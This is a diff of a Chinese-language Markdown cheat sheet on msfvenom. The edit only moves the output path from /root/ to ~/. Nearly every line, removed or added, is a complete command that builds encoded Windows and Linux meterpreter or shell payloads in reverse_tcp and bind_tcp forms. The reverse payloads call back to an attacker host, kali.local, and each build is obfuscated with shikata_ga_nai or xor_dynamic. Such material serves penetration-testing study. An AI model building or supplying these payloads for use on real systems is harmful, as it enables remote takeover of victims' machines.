@@ -2,7 +2,7 @@
 
 查看帮助
 
-```shell
+```
 ┌──(root㉿kali)-[~]
 └─# msfvenom -h
 ```
@@ -59,48 +59,48 @@ Options:
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o ~/shell.exe
 ```
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o ~/shell.exe
 ```
 
 使用 msfvenom 生成 反弹 shell 的 exe_x64 文件
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o ~/shell.exe
 ```
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o ~/shell.exe
 ```
 
 使用 msfvenom 生成 正向连接的 exe_x86 文件
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o ~/shell.exe
 ```
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o ~/shell.exe
 ```
 
 使用 msfvenom 生成 正向连接的 exe_x64 文件
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_tcp RHOST=win.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_tcp RHOST=win.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o ~/shell.exe
 ```
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
+└─# msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o ~/shell.exe
 ```
 
 **linux**
@@ -109,48 +109,48 @@ Options:
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o ~/shell.elf
 ```
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o ~/shell.elf
 ```
 
 使用 msfvenom 生成 反弹 shell 的 elf_x64 文件
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o ~/shell.elf
 ```
 
 ```shell
 ┌──(root㉿kali)-[~]
-└─# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o ~/shell.elf
 ```
 
 使用 msfvenom 生成 正向连接的 elf_x86 文件
 
 ```shell
 ┌──(root㉿a-kali-23)-[~]
-└─# msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o ~/shell.elf
 ```
 
 ```shell
 ┌──(root㉿a-kali-23)-[~]
-└─# msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o ~/shell.elf
 ```
 
 使用 msfvenom 生成 正向连接的 elf_x64 文件
 
 ```shell
 ┌──(root㉿a-kali-23)-[~]
-└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o ~/shell.elf
 ```
 
 ```shell
 ┌──(root㉿a-kali-23)-[~]
-└─# msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
+└─# msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o ~/shell.elf
 ```
 
 ---
